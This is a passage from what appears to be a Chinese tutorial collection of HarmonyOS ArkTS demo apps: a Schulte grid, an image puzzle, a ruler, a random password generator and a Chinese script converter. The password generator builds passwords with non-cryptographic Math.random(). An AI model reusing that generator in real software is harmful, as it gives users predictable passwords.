number = 5 // 初始化舒尔特方格 initGrid() { this.numbers = [] for (let i = 0; i \u0026lt; 25; i++) { this.numbers.push(i + 1) } this.shuffleArray(JSON.parse(JSON.stringify(this.numbers))); this.currentIndex = 0; this.timeStart = Date.now() } // 随机打乱数组 shuffleArray(array: number[]) { for (let i = array.length - 1; i \u0026gt; 0; i--) { const j = Math.floor(Math.random() * 25); let temp = array[i] array[i] = array[j] array[j] = temp } this.numbers = array } // 判断是否完成 isCompleted() { return this.currentIndex === 25; } build() { Column({ space: 20 }) { Flex({ wrap: FlexWrap.Wrap }) { ForEach(this.numbers, (item: number, index: number) =\u0026gt; { Text(`${item}`) .width(`${this.widthItem}lpx`) .height(`${this.widthItem}lpx`) .margin(`${this.marginItem}lpx`) .fontSize(`${this.widthItem/2}lpx`) .textAlign(TextAlign.Center) .backgroundColor(Color.Orange) .fontColor(Color.White) .borderRadius(5) .visibility(item \u0026lt;= this.currentIndex ? Visibility.Hidden : Visibility.Visible) .onClick(() =\u0026gt; { if (this.numbers[index] === this.currentIndex + 1) { this.currentIndex++; if (this.isCompleted()) { console.info(\u0026#39;完成！\u0026#39;); promptAction.showDialog({ title: `用时`, message: `${((Date.now() - this.timeStart) / 1000).toFixed(3)}秒`, buttons: [ { text: \u0026#39;重新开始\u0026#39;, color: \u0026#39;#ffa500\u0026#39; } ], }).then(()=\u0026gt;{ this.initGrid(); }) } } else { console.info(\u0026#39;错误的顺序！\u0026#39;); } }) }) } .width(`${(this.widthItem + this.marginItem * 2) * 5}lpx`) .height(`${(this.widthItem + this.marginItem * 2) * 5}lpx`) // 开始按钮 Button(\u0026#39;开始\u0026#39;) .width(\u0026#39;50%\u0026#39;) .height(\u0026#39;10%\u0026#39;) .onClick(() =\u0026gt; { this.initGrid(); console.info(\u0026#39;游戏开始\u0026#39;); }); } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) } } Piece 拼图\n算法： 随机 剪裁 交换\nimport { fileIo as fs } from \u0026#39;@kit.CoreFileKit\u0026#39;; import { common } from \u0026#39;@kit.AbilityKit\u0026#39;; import { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; import { image } from \u0026#39;@kit.ImageKit\u0026#39;; import { photoAccessHelper } from \u0026#39;@kit.MediaLibraryKit\u0026#39;; // 定义拼图组件接口 interface PuzzlePiece { // 拼图块的像素地图 pixelMap: image.PixelMap; // 原始图片中的索引位置 originalIndex: number; } // 使用装饰器定义页面组件 @Entry @Component struct Page30 { // 状态变量：选中图片的URI @State selectedImageUrl: string = \u0026#39;\u0026#39;; // 状态变量：原始图片的URI @State originalImageUrl: string = \u0026#39;\u0026#39;; // 状态变量：存储拼图块的数组 @State puzzlePieces: Array\u0026lt;PuzzlePiece\u0026gt; = []; // 状态变量：记录当前选中的拼图块索引 @State selectedPiece: number = -1; // 弹出图片选择器方法 async openPicker() { try { let PhotoSelectOptions = new photoAccessHelper.PhotoSelectOptions(); PhotoSelectOptions.MIMEType = photoAccessHelper.PhotoViewMIMETypes.IMAGE_TYPE; PhotoSelectOptions.maxSelectNumber = 1; let photoPicker = new photoAccessHelper.PhotoViewPicker(); let uris: photoAccessHelper.PhotoSelectResult = await photoPicker.select(PhotoSelectOptions) if (!uris || uris.photoUris.length === 0) return; // 获取选中图片的第一张URI let uri: string = uris.photoUris[0]; // 打开文件读取流 let file = fs.openSync(uri, fs.OpenMode.READ_ONLY); // 获取当前上下文 let context = getContext(this) as common.UIAbilityContext; // 新建一个保存裁剪后图片的路径 let newUrl = context.filesDir + \u0026#39;/test\u0026#39; + new Date().getTime() + \u0026#39;.jpg\u0026#39;; // 复制图片到新的路径 fs.copyFileSync(file.fd, newUrl); // 关闭文件读取流 fs.closeSync(file); // 更新状态变量：设置显示图片的URI this.selectedImageUrl = newUrl; // 更新状态变量：保存原始图片的URI this.originalImageUrl = uri; // 图片更改时触发的方法 this.imgChange(); } catch (e) { console.error(\u0026#39;openPicker\u0026#39;, JSON.stringify(e)); } } // 图片更改处理方法 async imgChange() { try { // 创建图片源对象 const imageSource: image.ImageSource = image.createImageSource(this.selectedImageUrl); // 图片解码选项 let decodingOptions: image.DecodingOptions = { editable: true, desiredPixelFormat: 3, }; // 创建像素地图 let mPixelMap: image.PixelMap = await imageSource.createPixelMap(decodingOptions); // 获取图片信息 let mImageInfo: image.ImageInfo = await mPixelMap.getImageInfo(); // 计算每个拼图块的大小 const pieceSize: image.Size = { width: mImageInfo.size.width / 3, height: mImageInfo.size.height / 3, }; // 清空已有拼图块数据 this.puzzlePieces.splice(0); // 遍历图片生成9个拼图块 let count = 0; for (let row = 0; row \u0026lt; 3; row++) { for (let col = 0; col \u0026lt; 3; col++) { // 创建基于原图的新图片源 const imageSource = image.createImageSource(this.selectedImageUrl); // 创建新像素地图 let mPixelMap = await imageSource.createPixelMap(decodingOptions); // 计算裁剪区域 const cutRegion: image.Region = { x: col * pieceSize.width, y: row * pieceSize.height, size: pieceSize, }; // 裁剪像素地图 await mPixelMap.crop(cutRegion); // 创建并添加拼图块至数组 const piece: PuzzlePiece = { pixelMap: mPixelMap, originalIndex: count++, }; this.puzzlePieces.push(piece); } } // 打乱拼图块顺序 for (let i = this.puzzlePieces.length - 1; i \u0026gt; 0; i--) { const j = Math.floor(Math.random() * (i + 1)); let temp: PuzzlePiece = this.puzzlePieces[i]; this.puzzlePieces[i] = this.puzzlePieces[j]; this.puzzlePieces[j] = temp; } } catch (e) { console.error(\u0026#39;imgChange\u0026#39;, JSON.stringify(e)); } } // 构建UI界面 build() { Column() { // 添加选择图片按钮，点击后调用打开图片选择器方法 Button(\u0026#39;选择图片→\u0026#39;).onClick(() =\u0026gt; { this.openPicker(); }); // 显示原始图片（如果已选择） if (this.originalImageUrl) { Text(\u0026#39;原始图片↓\u0026#39;); Image(this.originalImageUrl) .width(\u0026#39;180lpx\u0026#39;) .height(\u0026#39;180lpx\u0026#39;) .objectFit(ImageFit.Contain); } // 如果有拼图块，则显示游戏区 if (this.puzzlePieces.length \u0026gt; 0) { Text(\u0026#39;游戏图片↓\u0026#39;); // 游戏区域采用网格布局 Grid() { // 遍历所有拼图块并创建网格项 ForEach(this.puzzlePieces, (item: PuzzlePiece, index: number) =\u0026gt; { GridItem() { // 显示拼图块图像 Image(item.pixelMap) .width(\u0026#39;200lpx\u0026#39;) .height(\u0026#39;200lpx\u0026#39;) .margin(\u0026#39;5lpx\u0026#39;) // 根据是否选中调整缩放比例 .scale(this.selectedPiece == index ? { x: 0.5, y: 0.5 } : { x: 1, y: 1 }) // 添加点击事件处理 .onClick(() =\u0026gt; { // 处理拼图交换逻辑 if (this.selectedPiece == -1) { this.selectedPiece = index; } else if (this.selectedPiece == index) { this.selectedPiece = -1; } else { let temp: PuzzlePiece = this.puzzlePieces[this.selectedPiece]; this.puzzlePieces[this.selectedPiece] = this.puzzlePieces[index]; this.puzzlePieces[index] = temp; this.selectedPiece = -1; // 检查拼图是否完成 let isSucc: boolean = true; for (let i = 0; i \u0026lt; this.puzzlePieces.length; i++) { console.info(\u0026#39;====item\u0026#39;, this.puzzlePieces[i].originalIndex, i); if (this.puzzlePieces[i].originalIndex !== i) { isSucc = false; break; } } // 如果拼图完成，弹出提示对话框 if (isSucc) { promptAction.showDialog({ message: \u0026#39;拼图完成！\u0026#39;, }); } } }); } }) // End of ForEach } // End of Grid .backgroundColor(\u0026#34;#fafafa\u0026#34;); // 设置网格背景色 } } // End of Column .width(\u0026#39;100%\u0026#39;); // 设置列宽度为100% } } ruler 直尺\nimport { window } from \u0026#39;@kit.ArkUI\u0026#39;; // 导入窗口相关的API import { deviceInfo } from \u0026#39;@kit.BasicServicesKit\u0026#39;; // 导入设备信息相关的API // 定义直尺线类 class RulerLine { index: number; // 线的索引 height: number; // 线的高度 constructor(index: number, height: number) { this.index = index; // 初始化索引 this.height = height; // 初始化高度 } // 显示线的编号 showNumber(): string { return this.index % 10 === 0 ? `${Math.floor(this.index / 10)}` : \u0026#39;\u0026#39;; // 每10个线显示一个编号 } } // 扩展文本样式 @Extend(Text) function fancy() { .fontColor(\u0026#34;#019dfe\u0026#34;) // 设置字体颜色 .fontSize(20); // 设置字体大小 } // 定义直尺组件 @Entry @Component struct RulerComponent { @State maxRulerHeight: number = 0; // 最大直尺高度 @State @Watch(\u0026#39;onCellWidthChanged\u0026#39;) cellWidthInPixels: number = 17.28; // 每毫米对应的像素 @State textWidth: number = 80; // 文本宽度 @State rulerLines: RulerLine[] = []; // 直尺线数组 @State leftOffsetX: number = -300; // 左侧偏移 @State currentPositionX: number = -300; // 当前X位置 @State @Watch(\u0026#39;onContainerHeightChanged\u0026#39;) containerHeight: number = 53; // 容器高度 @State originalContainerHeight: number = 53; // 原始容器高度 @State @Watch(\u0026#39;onCellWidthChanged\u0026#39;) containerWidth: number = 0; // 容器宽度 // 处理单元格宽度变化 onCellWidthChanged() { this.maxRulerHeight = vp2px(this.containerWidth) / this.cellWidthInPixels / 10; // 更新最大直尺高度 } // 处理容器高度变化 onContainerHeightChanged() { this.containerHeight = Math.max(this.containerHeight, 53); // 确保容器高度不小于53 } // 组件即将出现时 aboutToAppear(): void { // 设置当前应用为横屏显示 window.getLastWindow(getContext()).then((windowClass) =\u0026gt; { windowClass.setPreferredOrientation(window.Orientation.LANDSCAPE); // 设置为横屏 }); // 初始化直尺线 for (let i = 0; i \u0026lt;= 15 * 10; i++) { let lineHeight: number = (i % 10 === 0) ? 90 : (i % 5 === 0) ? 60 : 45; // 根据索引设置线的高度 this.rulerLines.push(new RulerLine(i, lineHeight)); // 将新线添加到数组中 } } // 构建UI build() { Column() { // 创建一个列布局 Stack() { // 创建一个堆叠布局 Stack() { // 创建另一个堆叠布局 ForEach(this.rulerLines, (line: RulerLine, index: number) =\u0026gt; { // 遍历直尺线数组 Line()// 创建一条线 .width(1)// 设置线宽 .height(`${line.height}px`)// 设置线高 .backgroundColor(Color.White)// 设置线的背景颜色 .margin({ left: `${this.cellWidthInPixels * index}px` }); // 设置线的左边距 Text(line.showNumber())// 显示线的编号 .fontColor(Color.White)// 设置字体颜色 .fontSize(18)// 设置字体大小 .width(`${this.textWidth}px`)// 设置文本宽度 .height(`${this.textWidth}px`)// 设置文本高度 .textAlign(TextAlign.Center)// 设置文本对齐方式 .margin({ left: `${this.cellWidthInPixels * index - this.textWidth / 2}px`, top: `${line.height}px` }); // 设置文本位置 }); }.width(\u0026#39;100%\u0026#39;).height(\u0026#39;100%\u0026#39;).align(Alignment.TopStart); // 设置堆叠布局的宽高和对齐方式 Column({ space: 15 }) { // 创建一个列布局，设置间距 Text(`当前设备：${deviceInfo.marketName}`).fancy(); // 显示当前设备名称 Counter() { // 创建一个计数器 Text(`选中区距离：${this.maxRulerHeight.toFixed(2)}厘米`).fancy(); // 显示选中区距离 } .foregroundColor(Color.White) // 设置计数器字体颜色 .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加计数器时的处理 this.containerHeight = px2vp(vp2px(this.containerHeight) + this.cellWidthInPixels / 10); // 更新容器高度 }) .onDec(() =\u0026gt; { // 减少计数器时的处理 this.containerHeight = px2vp(vp2px(this.containerHeight) - this.cellWidthInPixels / 10); // 更新容器高度 }); Counter() { // 创建另一个计数器 Text(`每毫米间距：${this.cellWidthInPixels.toFixed(2)}px`).fancy(); // 显示每毫米间距 } .foregroundColor(Color.White) // 设置计数器字体颜色 .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加计数器时的处理 this.cellWidthInPixels += 0.01; // 增加每毫米间距 }) .onDec(() =\u0026gt; { // 减少计数器时的处理 this.cellWidthInPixels = Math.max(0.01, this.cellWidthInPixels - 0.01); // 减少每毫米间距，确保不小于0.01 }); } RelativeContainer() { // 创建一个相对布局容器 Rect()// 创建一个矩形 .fill(\u0026#34;#80019dfe\u0026#34;)// 设置填充颜色 .borderColor(\u0026#34;#019dfe\u0026#34;)// 设置边框颜色 .borderWidth({ left: 1, right: 1 })// 设置边框宽度 .clip(true)// 启用裁剪 .width(\u0026#34;100%\u0026#34;)// 设置宽度为100% .height(\u0026#34;100%\u0026#34;)// 设置高度为100% .onAreaChange((oldArea: Area, newArea: Area) =\u0026gt; { // 处理区域变化 this.containerWidth = newArea.width as number; // 更新容器宽度 }); Stack() { // 创建一个堆叠布局 Circle({ height: 30, width: 30 })// 创建一个圆形 .fill(\u0026#34;#019dfe\u0026#34;)// 设置填充颜色 .stroke(Color.Transparent)// 设置边框颜色为透明 .strokeWidth(3); // 设置边框宽度 Circle({ height: 40, width: 40 })// 创建另一个圆形 .fill(Color.Transparent)// 设置填充颜色为透明 .stroke(\u0026#34;#019dfe\u0026#34;)// 设置边框颜色 .strokeWidth(3); // 设置边框宽度 } .hitTestBehavior(HitTestMode.Block) // 设置碰撞检测行为 .padding(20) // 设置内边距 .alignRules({ // 设置对齐规则 center: { anchor: \u0026#34;__container__\u0026#34;, align: VerticalAlign.Center }, // 垂直居中 middle: { anchor: \u0026#34;__container__\u0026#34;, align: HorizontalAlign.Start } // 左对齐 }) .gesture(PanGesture({ // 左侧拖动手势 fingers: 1, // 单指拖动 direction: PanDirection.Horizontal, // 水平拖动 distance: 1 // 最小拖动距离 }).onActionUpdate((event: GestureEvent) =\u0026gt; { // 拖动更新时的处理 this.leftOffsetX = this.currentPositionX + event.offsetX / 2; // 更新左侧偏移 this.containerHeight = this.originalContainerHeight - event.offsetX; // 更新容器高度 }).onActionEnd(() =\u0026gt; { // 拖动结束时的处理 this.currentPositionX = this.leftOffsetX; // 更新位置 this.originalContainerHeight = this.containerHeight; // 更新原始高度 })); Stack() { // 创建另一个堆叠布局 Circle({ height: 30, width: 30 })// 创建一个圆形 .fill(\u0026#34;#019dfe\u0026#34;)// 设置填充颜色 .stroke(Color.Transparent)// 设置边框颜色为透明 .strokeWidth(3); // 设置边框宽度 Circle({ height: 40, width: 40 })// 创建另一个圆 .fill(Color.Transparent)// 设置填充颜色为透明 .stroke(\u0026#34;#019dfe\u0026#34;)// 设置边框颜色 .strokeWidth(3); // 设置边框宽度 } .hitTestBehavior(HitTestMode.Block) // 设置碰撞检测行为 .padding(20) // 设置内边距 .alignRules({ // 设置对齐规则 center: { anchor: \u0026#34;__container__\u0026#34;, align: VerticalAlign.Center }, // 垂直居中 middle: { anchor: \u0026#34;__container__\u0026#34;, align: HorizontalAlign.End } // 右对齐 }) .gesture(PanGesture({ // 右侧拖动手势 fingers: 1, // 单指拖动 direction: PanDirection.Horizontal, // 水平拖动 distance: 1 // 最小拖动距离 }).onActionUpdate((event: GestureEvent) =\u0026gt; { // 拖动更新时的处理 this.leftOffsetX = this.currentPositionX + event.offsetX / 2; // 更新左侧偏移 this.containerHeight = this.originalContainerHeight + event.offsetX; // 更新容器高度 }).onActionEnd(() =\u0026gt; { // 拖动结束时的处理 this.currentPositionX = this.leftOffsetX; // 更新位置 this.originalContainerHeight = this.containerHeight; // 更新原始高度 })); } .width(this.containerHeight) // 设置宽度 .height(\u0026#34;100%\u0026#34;) // 设置高度 .translate({ x: this.leftOffsetX }) // 使用左侧偏移 .gesture(PanGesture({ // 左侧拖动手势 fingers: 1, // 单指拖动 direction: PanDirection.Horizontal, // 水平拖动 distance: 1 // 最小拖动距离 }).onActionUpdate((event: GestureEvent) =\u0026gt; { // 拖动更新时的处理 if (event) { this.leftOffsetX = this.currentPositionX + event.offsetX; // 更新左侧偏移 } }).onActionEnd(() =\u0026gt; { // 拖动结束时的处理 this.currentPositionX = this.leftOffsetX; // 更新位置 })); } }.height(\u0026#39;100%\u0026#39;).width(\u0026#39;100%\u0026#39;) // 设置高度和宽度 .padding({ left: 30, right: 10 }) // 设置内边距 .backgroundColor(\u0026#34;#181b22\u0026#34;); // 设置背景颜色 } } randon password 随机密码\n// 导入剪贴板服务 import { pasteboard } from \u0026#39;@kit.BasicServicesKit\u0026#39;; // 导入弹窗提示服务 import { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; // 使用装饰器定义一个可观察的类，用于密码选项 @ObservedV2 class PasswordOption { name: string; // 选项名称 characters: string; // 该选项对应的字符集 // 定义是否选中，默认为true @Trace selected: boolean = true; // 定义是否启用，默认为true @Trace enabled: boolean = true; // 构造函数，初始化name和characters constructor(name: string, characters: string) { this.name = name; this.characters = characters; } } // 使用装饰器定义一个入口组件 @Entry @Component struct PasswordGeneratorPage { // 定义密码选项数组 @State options: PasswordOption[] = [ new PasswordOption(\u0026#34;大写字母\u0026#34;, \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;), new PasswordOption(\u0026#34;小写字母\u0026#34;, \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;), new PasswordOption(\u0026#34;数字\u0026#34;, \u0026#34;0123456789\u0026#34;), new PasswordOption(\u0026#34;特殊字符\u0026#34;, \u0026#34;!@#$%^\u0026amp;*()_+-=[]{}|;:,.\u0026lt;\u0026gt;?\u0026#34;), ]; // 定义密码长度状态，默认值为10 @State passwordLength: number = 10; // 基础间距 @State baseSpacing: number = 30; // 生成的密码 @State generatedPassword: string = \u0026#39;\u0026#39;; // 是否启用复制按钮 @State isCopyButtonEnabled: boolean = false; // 主题色 @State primaryColor: string = \u0026#39;#71dec7\u0026#39;; // 字体颜色 @State fontColor: string = \u0026#34;#2e2e2e\u0026#34;; // 生成密码的方法 generatePassword() { let characterSet = \u0026#39;\u0026#39;; // 初始化字符集合 // 遍历所有选项，如果选项被选中则加入字符集合 for (let option of this.options) { if (option.selected) { characterSet += option.characters } } let password = \u0026#39;\u0026#39;; // 初始化密码字符串 // 根据密码长度生成随机密码 for (let i = 0; i \u0026lt; this.passwordLength; i++) { const randomIndex = Math.floor(Math.random() * characterSet.length); password += characterSet[randomIndex]; } this.generatedPassword = password; // 更新生成的密码 } // 复制到剪贴板的方法 copyToClipboard(text: string) { const pasteboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // 创建剪贴板数据 const systemPasteboard = pasteboard.getSystemPasteboard(); // 获取系统剪贴板 systemPasteboard.setData(pasteboardData); // 将数据放入剪切板 promptAction.showToast({ message: \u0026#39;已复制\u0026#39; }); // 显示复制成功的提示 } // 检查选项选择状态的方法 checkOptionsSelection() { let selectedCount = 0; // 记录已选中的选项数量 let lastSelectedIndex = 0; // 记录最后一个选中的选项索引 // 遍历所有选项 for (let i = 0; i \u0026lt; this.options.length; i++) { this.options[i].enabled = true; // 默认启用所有选项 if (this.options[i].selected) { lastSelectedIndex = i; // 更新最后一个选中的选项索引 selectedCount++; // 增加选中计数 } } // 如果只有一个选项被选中，则禁用该选项防止其被取消选中 if (selectedCount === 1) { this.options[lastSelectedIndex].enabled = false; } } // 构建页面布局的方法 build() { Column() { // 标题栏 Text(\u0026#34;随机密码生成\u0026#34;) .width(\u0026#39;100%\u0026#39;)// 设置宽度为100% .height(54)// 设置高度为54 .fontSize(18)// 设置字体大小 .fontWeight(600)// 设置字体粗细 .backgroundColor(Color.White)// 设置背景颜色 .textAlign(TextAlign.Center)// 设置文本居中对齐 .fontColor(this.fontColor); // 设置字体颜色 // 密码长度设置部分 Column() { Row() { Text(`密码长度：`)// 密码长度标签 .fontWeight(600) .fontSize(18) .fontColor(this.fontColor); Text(`${this.passwordLength}`)// 显示当前密码长度 .fontWeight(600) .fontSize(18) .fontColor(this.primaryColor); } .margin({ top: `${this.baseSpacing}lpx`, left: `${this.baseSpacing}lpx` }); // 滑动条设置密码长度 Row() { Text(\u0026#39;4\u0026#39;).fontColor(this.fontColor).width(20); Slider({ value: this.passwordLength, // 当前值 min: 4, // 最小值 max: 32, // 最大值 style: SliderStyle.InSet // 滑动条样式 }) .layoutWeight(1)// 布局权重 .blockColor(Color.White)// 滑块颜色 .trackColor(\u0026#39;#EBEBEB\u0026#39;)// 轨道颜色 .trackThickness(30)// 轨道厚度 .blockSize({ width: 55, height: 55 })// 滑块大小 .selectedColor(this.primaryColor)// 选中颜色 .onChange((value: number, mode: SliderChangeMode) =\u0026gt; { this.passwordLength = value; // 更新密码长度 console.info(\u0026#39;value:\u0026#39; + value + \u0026#39;mode\u0026#39; + mode.toString); // 打印日志 }); Text(\u0026#39;32\u0026#39;).fontColor(this.fontColor).width(20); }.margin({ left: `${this.baseSpacing}lpx`, right: `${this.baseSpacing}lpx`, top: `${this.baseSpacing}lpx`, }); // 选项设置部分 Text(\u0026#39;选项\u0026#39;) .fontWeight(600) .fontSize(18) .fontColor(this.fontColor) .margin({ left: `${this.baseSpacing}lpx`, top: `${this.baseSpacing}lpx`, bottom: `${this.baseSpacing}lpx` }); // 动态生成每个选项的UI元素 ForEach(this.options, (option: PasswordOption, index: number) =\u0026gt; { Row() { Text(option.name)// 选项名称 .fontWeight(400) .fontSize(16) .fontColor(this.fontColor) .layoutWeight(1); Toggle({ type: ToggleType.Switch, isOn: option.selected })// 切换按钮 .width(\u0026#39;100lpx\u0026#39;) .height(\u0026#39;50lpx\u0026#39;) .enabled(option.enabled)// 是否启用切换 .selectedColor(this.primaryColor) .onChange((isOn: boolean) =\u0026gt; { option.selected = isOn; // 更新选项状态 this.checkOptionsSelection(); // 检查选项选择状态 }); } .width(\u0026#39;100%\u0026#39;) .padding({ left: `${this.baseSpacing}lpx`, right: `${this.baseSpacing}lpx`, top: `${this.baseSpacing / 3}lpx`, bottom: `${this.baseSpacing / 3}lpx` }) .hitTestBehavior(HitTestMode.Block) .onClick(() =\u0026gt; { if (option.enabled) { option.selected = !option.selected; // 切换选项状态 } }); }); // 生成密码按钮 Text(\u0026#39;生成密码\u0026#39;) .fontColor(Color.White) .backgroundColor(this.primaryColor) .height(54) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`${650 - this.baseSpacing * 2}lpx`) .margin({ top: `${this.baseSpacing}lpx`, left: `${this.baseSpacing}lpx`, right: `${this.baseSpacing}lpx`, bottom: `${this.baseSpacing}lpx` }) .clickEffect({ level: ClickEffectLevel.HEAVY, scale: 0.8 })// 点击效果 .onClick(() =\u0026gt; { this.generatePassword(); // 生成密码 }); } .width(\u0026#39;650lpx\u0026#39;) .margin({ top: 20 }) .backgroundColor(Color.White) .borderRadius(10) .alignItems(HorizontalAlign.Start); // 显示生成的密码 Column() { Text(`密码结果：`) .fontWeight(600) .fontSize(18) .fontColor(this.fontColor) .margin({ top: `${this.baseSpacing}lpx`, left: `${this.baseSpacing}lpx`, }); Text(`${this.generatedPassword}`)// 显示生成的密码 .width(\u0026#39;650lpx\u0026#39;) .fontColor(this.primaryColor) .fontSize(18) .textAlign(TextAlign.Center) .padding({ left: 5, right: 5 }) .margin({ top: `${this.baseSpacing / 3}lpx` }); // 复制按钮 Text(\u0026#39;复制\u0026#39;) .enabled(this.generatedPassword ? true : false)// 只有生成了密码才启用复制按钮 .fontColor(Color.White) .backgroundColor(this.primaryColor) .height(54) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`${650 - this.baseSpacing * 2}lpx`) .margin({ top: `${this.baseSpacing}lpx`, left: `${this.baseSpacing}lpx`, right: `${this.baseSpacing}lpx`, bottom: `${this.baseSpacing}lpx` }) .clickEffect({ level: ClickEffectLevel.HEAVY, scale: 0.8 }) .onClick(() =\u0026gt; { this.copyToClipboard(this.generatedPassword); // 复制密码 }); } .width(\u0026#39;650lpx\u0026#39;) .backgroundColor(Color.White) .borderRadius(10) .margin({ top: `${this.baseSpacing}lpx` }) .alignItems(HorizontalAlign.Start); } .height(\u0026#39;100%\u0026#39;) .width(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#34;#f2f3f5\u0026#34;); // 页面背景颜色 } } chinese ohpm install @nutpi/chinese_transverter\n// 导入必要的转换库，提供简体与繁体之间的转换功能 import { transverter, TransverterType, TransverterLanguage } from \u0026#34;@nutpi/chinese_transverter\u0026#34;; // 导入剪贴板服务，用于将文本复制到系统剪贴板 import { pasteboard } from \u0026#39;@kit.BasicServicesKit\u0026#39;; // 导入提示服务，用于向用户显示消息 import { promptAction } from \u0026#39;@kit.ArkUI\u0026#39;; // 使用@Entry装饰器标记此组件为应用的入口点 @Entry // 使用@Component装饰器定义一个名为SimplifiedTraditionalConverter的组件 @Component struct SimplifiedTraditionalConverter { // 定义状态变量inputText，存储用户输入的原始文本，当其值变化时触发onInputTextChanged方法 @State @Watch(\u0026#39;onInputTextChanged\u0026#39;) inputText: string = \u0026#39;\u0026#39;; // 定义状态变量simplifiedResult，存储转换后的简体结果 @State simplifiedResult: string = \u0026#39;\u0026#39;; // 定义状态变量traditionalResult，存储转换后的繁体结果 @State traditionalResult: string = \u0026#39;\u0026#39;; // 定义状态变量isInputFocused，表示输入框是否获得了焦点 @State isInputFocused: boolean = false; // 定义主题颜色 @State private themeColor: string = \u0026#39;#439fff\u0026#39;; // 定义文本颜色 @State private textColor: string = \u0026#34;#2e2e2e\u0026#34;; // 定义基础内边距大小 @State private basePadding: number = 30; // 定义最小文本区域高度 @State private minTextAreaHeight: number = 50; // 定义最大文本区域高度 @State private maxTextAreaHeight: number = 300; // 当inputText状态改变时触发的方法，用于更新转换结果 onInputTextChanged() { // 将inputText转换为简体，并更新simplifiedResult this.simplifiedResult = transverter({ type: TransverterType.SIMPLIFIED, str: this.inputText, language: TransverterLanguage.ZH_CN }); // 将inputText转换为繁体，并更新traditionalResult this.traditionalResult = transverter({ type: TransverterType.TRADITIONAL, str: this.inputText, language: TransverterLanguage.ZH_CN }); } // 将给定的文本复制到剪贴板，并显示提示信息 private copyToClipboard(text: string): void { const clipboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // 创建剪贴板数据 const systemClipboard = pasteboard.getSystemPasteboard(); // 获取系统剪贴板 systemClipboard.setData(clipboardData); // 设置剪贴板数据 promptAction.showToast({ message: \u0026#39;已复制到剪贴板\u0026#39; }); // 显示复制成功的提示 } // 构建组件的UI build() { Scroll() { // 创建可滚动的容器 Column() { // 在滚动容器中创建垂直布局 // 创建标题文本 Text(\u0026#34;简体繁体转换器\u0026#34;) .width(\u0026#39;100%\u0026#39;) .height(54) .fontSize(18) .fontWeight(600) .backgroundColor(Color.White) .textAlign(TextAlign.Center) .fontColor(this.textColor); // 创建用户输入区域 Column() { // 创建多行文本输入框 TextArea({ text: $$this.inputText, placeholder: \u0026#39;请输入简体/繁体字（支持混合输入）\u0026#39; }) .fontSize(18) .placeholderColor(this.isInputFocused ? this.themeColor : Color.Gray) .fontColor(this.isInputFocused ? this.themeColor : this.textColor) .borderColor(this.isInputFocused ? this.themeColor : Color.Gray) .caretColor(this.themeColor) .onBlur(() =\u0026gt; this.isInputFocused = false) // 当输入框失去焦点时，更新isInputFocused状态 .onFocus(() =\u0026gt; this.isInputFocused = true) // 当输入框获得焦点时，更新isInputFocused状态 .borderWidth(1) .borderRadius(10) .backgroundColor(Color.White) .constraintSize({ minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight }); // 创建清空按钮 Text(\u0026#39;清空\u0026#39;) .borderWidth(1) .borderColor(this.themeColor) .fontColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`${650 - this.basePadding * 2}lpx`) .margin({ top: `${this.basePadding}lpx` }) .clickEffect({ level: ClickEffectLevel.HEAVY, scale: 0.8 }) // 添加点击效果 .onClick(() =\u0026gt; this.inputText = \u0026#34;\u0026#34;); // 清空输入框 } .width(\u0026#39;650lpx\u0026#39;) .padding(`${this.basePadding}lpx`) .margin({ top: 20 }) .backgroundColor(Color.White) .borderRadius(10) .alignItems(HorizontalAlign.Start); // 创建繁体结果展示与复制区域 Column() { // 创建繁体结果标题 Text(`繁体结果：`) .fontWeight(600) .fontSize(18) .fontColor(this.textColor); // 创建繁体结果展示文本 Text(`${this.traditionalResult}`) .constraintSize({ minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight }) .fontColor(this.themeColor) .fontSize(18) .textAlign(TextAlign.Start) .copyOption(CopyOptions.InApp) .margin({ top: `${this.basePadding / 3}lpx` }); // 创建复制繁体结果按钮 Text(\u0026#39;复制\u0026#39;) .enabled(this.traditionalResult ? true : false) // 只有当有繁体结果时，按钮才可用 .fontColor(Color.White) .backgroundColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`${650 - this.basePadding * 2}lpx`) .margin({ top: `${this.basePadding}lpx` }) .clickEffect({ level: ClickEffectLevel.HEAVY, scale: 0.8 }) .onClick(() =\u0026gt; this.copyToClipboard(this.traditionalResult)); // 复制繁体结果到剪贴板 } .width(\u0026#39;650lpx\u0026#39;) .padding(`${this.basePadding}lpx`) .backgroundColor(Color.White) .borderRadius(10) .margin({ top: `${this.basePadding}lpx` }) .alignItems(HorizontalAlign.Start); // 创建简体结果展示与复制区域 Column() { // 创建简体结果标题 Text(`简体结果：`) .fontWeight(600) .fontSize(18) .fontColor(this.textColor); // 创建简体结果展示文本 Text(`${this.simplifiedResult}`) .constraintSize({ minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight }) .fontColor(this.themeColor) .fontSize(18) .textAlign(TextAlign.Start) .copyOption(CopyOptions.InApp) .margin({ top: `${this.basePadding / 3}lpx` }); // 创建复制简体结果按钮 Text(\u0026#39;复制\u0026#39;) .enabled(this.simplifiedResult ? true : false) // 只有当有简体结果时，按钮才可用 .fontColor(Color.White) .backgroundColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`${650 - this.basePadding * 2}lpx`) .margin({ top: `${this.basePadding}lpx` }) .clickEffect({ level: ClickEffectLevel.HEAVY, scale: 0.8 }) .onClick(() =\u0026gt; this.copyToClipboard(this.simplifiedResult)); // 复制简体结果到剪贴板 } .width(\u0026#39;650lpx\u0026#39;) 